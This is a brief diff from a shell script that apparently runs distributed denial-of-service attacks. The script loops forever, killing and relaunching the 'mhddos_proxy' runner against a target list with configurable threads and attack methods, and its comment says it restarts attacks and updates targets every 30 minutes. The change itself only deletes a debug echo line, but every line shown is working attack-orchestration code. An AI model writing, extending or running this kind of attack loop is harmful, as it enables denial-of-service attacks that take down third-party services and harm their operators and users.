@@ -213,7 +213,6 @@ fi
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
